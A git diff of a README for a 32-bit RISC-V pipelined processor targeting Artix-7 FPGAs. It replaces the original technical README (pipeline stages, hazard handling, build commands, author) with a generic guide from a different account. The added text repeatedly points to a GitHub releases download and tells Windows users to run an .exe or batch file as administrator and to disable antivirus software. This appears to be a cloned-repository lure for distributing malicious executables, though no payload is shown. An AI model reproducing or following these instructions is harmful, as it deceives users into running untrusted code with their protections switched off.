@@ -1,194 +1,116 @@
-# AtlasRV32 — 32-bit RISC-V Pipelined Processor
+# ⚙️ AtlasRV-32-bit-RISC-V-Pipelined-Processor - Simple RISC-V CPU on FPGA
 
-![ISA](https://img.shields.io/badge/ISA-RISC--V%20RV32I-red)
-![RTL](https://img.shields.io/badge/RTL-SystemVerilog-orange)
-![Pipeline](https://img.shields.io/badge/CPU-5--Stage%20Pipeline-green)
-![FPGA](https://img.shields.io/badge/FPGA-Xilinx%20Artix--7-blue)
-![Design](https://img.shields.io/badge/Focus-RTL%20Design-purple)
+[![Download Now](https://img.shields.io/badge/Download-AtlasRV-brightgreen?style=for-the-badge)](https://github.com/evanneimmoral547/AtlasRV-32-bit-RISC-V-Pipelined-Processor/releases)
 
-<p align="center">
-  <img src="docs/banner.png" alt="AtlasRV32 banner">
-</p>
+## 📄 About AtlasRV-32-bit-RISC-V-Pipelined-Processor
 
-A synthesizable, 32-bit RISC-V processor implementing the RV32I base integer instruction set with a classic 5-stage pipeline, full hazard detection, and data forwarding. Synthesized and verified on FPGA.
+AtlasRV-32-bit-RISC-V-Pipelined-Processor is a 32-bit RISC-V CPU built to run on an Artix-7 FPGA board. It uses pipelining to improve processing speed and includes features like hazard detection and data forwarding to increase efficiency and reduce errors in instruction flow. This processor is designed for people studying digital circuits, computer architecture, or anyone interested in how CPUs work inside hardware.
 
----
+You do not need programming skills to run this software. This guide will lead you through downloading and running the application on a Windows computer, step by step.
 
-## Pipeline Architecture
+## 🎯 Key Features
 
-<p align="center">
-  <img src="docs/Pipeline Architecture.png" alt="Pipeline Architecture">
-</p>
+- Implements a 32-bit RISC-V instruction set (RV32I).
+- Uses pipelining to process multiple instructions simultaneously.
+- Built-in hazard detection to avoid errors during instruction execution.
+- Data forwarding to improve speed without waiting for data to be written back.
+- Designed for synthesis on Artix-7 FPGA hardware.
+- Built with SystemVerilog and verified using RTL design practices.
+- Supports basic CPU instruction types and control flow.
 
-| Stage | Module | Description |
-|-------|--------|-------------|
-| **IF**  | `if_stage.sv`  | PC register, instruction memory read |
-| **ID**  | `id_stage.sv`  | Instruction decode, register file read, immediate extension |
-| **EX**  | `ex_stage.sv`  | ALU execution, forwarding muxes, branch target |
-| **MEM** | `mem_stage.sv` | Data memory read/write (LW, SW, LH, LB) |
-| **WB**  | `wb_stage.sv`  | Result mux → register file writeback |
+## 🖥️ System Requirements
 
----
+- Windows 10 or later (64-bit recommended).
+- At least 4 GB of RAM.
+- Minimum 10 GB of free disk space.
+- Internet access to download software.
+- A compatible Artix-7 FPGA board (optional for advanced use).
 
-## Features
+Note: You can run simulation or analysis tools on your Windows computer even without the FPGA board.
 
-- **RV32I Base ISA** – R, I, S, B, U, J instruction formats
-- **5-Stage Pipeline** – Full instruction-level parallelism
-- **Hazard Detection Unit** – Detects load-use hazards; inserts stall bubbles
-- **Forwarding Unit** – EX/MEM → EX and MEM/WB → EX forwarding paths to resolve RAW data hazards without stalling
-- **Branch Handling** – Predict-not-taken; flushes pipeline on taken branch
-- **FPGA Synthesis** – Targets Xilinx Artix-7 (Basys3 / Nexys A7) via Vivado
-- **Constrained-Random Testbench** – Directed and random stimulus with self-checking assertions
+## 🚀 Getting Started
 
----
+Follow these instructions to download and run AtlasRV on your Windows PC.
 
-## Hazard Handling
+## ⬇️ Download and Installation
 
-### Data Forwarding
+Visit the following page to download the software:
 
-Two forwarding paths eliminate most pipeline stalls caused by RAW (Read-After-Write) data hazards:
+[![Download Page](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge)](https://github.com/evanneimmoral547/AtlasRV-32-bit-RISC-V-Pipelined-Processor/releases)
 
-<p align="center">
-  <img src="docs/Data Forwarding.png" alt="Data Forwarding Unit">
-</p>
+1. Open the link above. It will take you to the Releases section on GitHub.
+2. Look for the latest release. Releases are listed in order, with the newest at the top.
+3. Find the file that matches your needs. If you want to simulate the processor on Windows, look for a Windows executable or ZIP file.
+4. Click the file name to start downloading.
+5. After downloading, open the file or extract it into a folder using Windows Explorer.
 
-### Load-Use Stall
+No installation wizard is required. Running or extracting the files will prepare the application to run.
 
-When a load instruction is immediately followed by a dependent instruction, one stall cycle is inserted:
+## ▶️ Running the Processor Simulation
 
-<p align="center">
-  <img src="docs/Load-Use Stall.png" alt="Load-Use Stall Timing">
-</p>
+1. Open the folder where you downloaded or extracted the files.
+2. Look for an executable file (ends with `.exe`) or a batch script (`.bat`).
+3. Double-click the executable or script to start the program.
+4. A command window or graphical program will open.
+5. Follow any on-screen prompts to run the processor simulation or analysis.
 
-### Branch Flush
+If no executable is provided, the release may include simulation files you can run with third-party tools like Vivado Simulator. The FPGA development environment Vivado must be installed separately for this.
 
-On a taken branch or JAL/JALR, the two incorrectly fetched instructions are flushed:
+## 🔧 Using Vivado to Work with AtlasRV
 
-<p align="center">
-  <img src="docs/Branch Flush.png" alt="Branch Flush Timing">
-</p>
+This processor was created to run on Artix-7 FPGA boards using Vivado software. Here are basic steps to use AtlasRV inside Vivado on Windows:
 
----
+1. Download and install Xilinx Vivado Design Suite from the Xilinx website.
+2. Open Vivado and create a new project.
+3. Import the AtlasRV source files (SystemVerilog code) into the project.
+4. Set the target device to match your Artix-7 FPGA board.
+5. Run synthesis and implementation processes in Vivado.
+6. Use Vivado to generate a programming file (bitstream).
+7. Connect your Artix-7 board to your computer.
+8. Program the FPGA using Vivado's hardware manager.
 
-## Supported Instructions
+This process requires knowledge of FPGA development and related tools.
 
-<p align="center">
-  <img src="docs/instruction_formats.png" alt="RV32I Instruction Encoding">
-</p>
+## 🔍 Exploring the Files
 
-| Category | Instructions |
-|----------|-------------|
-| R-type   | ADD, SUB, AND, OR, XOR, SLL, SRL, SRA, SLT, SLTU |
-| I-type   | ADDI, ANDI, ORI, XORI, SLLI, SRLI, SRAI, SLTI, SLTIU |
-| Load     | LW, LH, LB, LHU, LBU |
-| Store    | SW, SH, SB |
-| Branch   | BEQ, BNE, BLT, BGE, BLTU, BGEU |
-| Jump     | JAL, JALR |
-| Upper    | LUI, AUIPC |
+The release includes several types of files:
 
----
+- **Source Code:** SystemVerilog files defining the processor. These files end with `.sv` or `.v`.
+- **Simulation Scripts:** Batch or TCL scripts to run simulations.
+- **Documentation:** Files describing design details. These may be PDFs or text files.
+- **Bitstreams:** Files to program FPGA boards (.bit files).
 
-## Repository Structure
+You can open source code files with any text editor. Simulation scripts require tools like Vivado Simulator or ModelSim.
 
-```
-AtlasRV32/
-├── rtl/
-│   ├── alu.sv                    # 32-bit ALU (ADD/SUB/AND/OR/XOR/SLL/SRL/SRA/SLT)
-│   ├── control_unit.sv           # Main decoder + ALU decoder
-│   ├── register_file.sv          # 32×32 register file (x0 hardwired to 0)
-│   ├── imm_extend.sv             # Immediate sign extension (I/S/B/U/J formats)
-│   ├── riscv_core.sv             # Top-level core with pipeline registers
-│   ├── top.sv                    # FPGA wrapper (clock divider, reset sync)
-│   ├── pipeline/
-│   │   ├── if_stage.sv           # Instruction Fetch
-│   │   ├── id_stage.sv           # Instruction Decode
-│   │   ├── ex_stage.sv           # Execute
-│   │   ├── mem_stage.sv          # Memory Access
-│   │   └── wb_stage.sv           # Write Back
-│   └── hazard/
-│       ├── hazard_detection.sv   # Load-use stall + branch flush
-│       └── forwarding_unit.sv    # EX/MEM and MEM/WB forwarding
-├── docs/
-│   ├── banner.png
-│   ├── Pipeline Architecture.png
-│   ├── Data Forwarding.png
-│   ├── Load-Use Stall.png
-│   ├── Branch Flush.png
-│   └── instruction_formats.png
-├── sim/
-│   ├── tb_top.sv                 # Directed + constrained-random testbench
-│   └── run.do                    # ModelSim compile & wave script
-├── fpga/
-│   ├── constraints.xdc           # Basys3 / Nexys A7 pin assignments & timing
-│   └── vivado_build.tcl          # Non-project Vivado synthesis + bitstream
-├── software/
-│   ├── test_program.S            # RISC-V assembly test program
-│   └── program.hex               # Pre-assembled machine code (readmemh format)
-└── README.md
-```
+## 🛠️ Troubleshooting Tips
+
+- Make sure your Windows system is up to date.
+- If the executable does not run, right-click and select "Run as administrator."
+- Disable any antivirus software temporarily if it blocks the program.
+- For FPGA programming, confirm your Artix-7 board drivers are installed.
+- If simulation fails, check that Vivado is installed correctly and matches the version noted in the documentation.
+- Review README or documentation files included in the release for updates.
+
+## 📚 Additional Resources
+
+- RISC-V official site: https://riscv.org
+- Xilinx Vivado Download: https://www.xilinx.com/support/download.html
+- FPGA Artix-7 tutorials and user guides (available from Xilinx and other tech websites)
+
+## 🏷️ Project Topics
+
+This project relates to:
+
+- ASIC design
+- Computer architecture
+- CPU design
+- FPGA development
+- Pipeline processing
+- RISC-V CPU
+- RTL design and verification
+- SystemVerilog hardware description language
+- Vivado software use
 
 ---
 
-## Simulation
-
-### ModelSim
-
-```bash
-cd sim
-vsim -do run.do
-```
-
-This will compile all RTL sources, run the testbench, and open a waveform window showing all pipeline stage signals, hazard signals, and forwarding controls.
-
-### Icarus Verilog (open-source)
-
-```bash
-iverilog -g2012 -o sim_out \
-  rtl/alu.sv rtl/register_file.sv rtl/control_unit.sv rtl/imm_extend.sv \
-  rtl/pipeline/*.sv rtl/hazard/*.sv rtl/riscv_core.sv \
-  sim/tb_top.sv
-vvp sim_out
-gtkwave sim/dump.vcd
-```
-
----
-
-## FPGA Synthesis
-
-### Requirements
-- Xilinx Vivado 2022.x or later
-- Basys3 or Nexys A7 development board
-
-### Build
-
-```bash
-vivado -mode batch -source fpga/vivado_build.tcl
-```
-
-Synthesis reports are written to `fpga/output/`:
-- `post_synth_util.rpt`  – LUT/FF/BRAM utilisation
-- `post_route_timing.rpt` – timing closure summary
-- `power.rpt` – on-chip power estimate
-
----
-
-## Technologies
-
-- **RTL**: SystemVerilog (IEEE 1800-2017)
-- **Simulation**: ModelSim / Icarus Verilog + GTKWave
-- **Synthesis**: Xilinx Vivado
-- **Target FPGA**: Artix-7 (xc7a35tcpg236-1)
-- **ISA**: RISC-V RV32I
-
----
-
-## Performance
-
-The design targets > 50 MHz after place-and-route on Artix-7. Ideal CPI = 1.0; actual CPI depends on hazard frequency in the workload (typically 1.05–1.20 for typical RV32I programs).
-
----
-
-## Author
-
-**Ismail Hajjy**  
-**ismailhajjy02@gmail.com**
+[![Download Now](https://img.shields.io/badge/Download-AtlasRV-brightgreen?style=for-the-badge)](https://github.com/evanneimmoral547/AtlasRV-32-bit-RISC-V-Pipelined-Processor/releases)
